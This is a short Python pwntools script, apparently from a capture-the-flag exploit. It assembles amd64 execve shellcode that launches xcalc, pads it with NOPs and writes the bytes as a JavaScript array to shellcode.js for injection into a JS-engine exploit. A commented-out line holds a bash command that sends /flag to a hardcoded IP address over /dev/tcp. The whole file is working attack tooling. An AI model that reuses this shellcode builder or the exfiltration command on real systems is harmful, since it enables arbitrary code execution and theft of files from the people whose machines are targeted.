from pwn import *

context.arch='amd64'
#cmd = '/bin/bash -c "cat /flag >/dev/tcp/192.168.25.146/12345"'
cmd='/usr/bin/xcalc'
#cmd='/bin/bash'
env='DISPLAY=:0'
#env='\x00'

cmd_off = 0x50

env_off = cmd_off + len(cmd) + 0x20
shellcode='''
lea    rdi, [rip + %d]
xor    rsi, rsi
push   rsi
push   rdi
push rsp
pop    rsi
xor rdx,rdx
push   rdx
lea    rdx,[rip+ %d ]
push   rdx
push   rsp
pop    rdx
mov    al,0x3b
syscall
''' % (cmd_off-0x7, env_off-25)
shellcode=asm(shellcode).ljust(cmd_off,'\x90')
shellcode+=cmd
shellcode=shellcode.ljust(env_off,'\x00')
shellcode+=env
shellcode+='\x00'

print(len(shellcode))
print(shellcode)

jsdata='sc = '+str([ord(i) for i in shellcode])+'\n'
print(jsdata)
with open('shellcode.js','w') as f:
	f.write(jsdata)
	f.close()

	
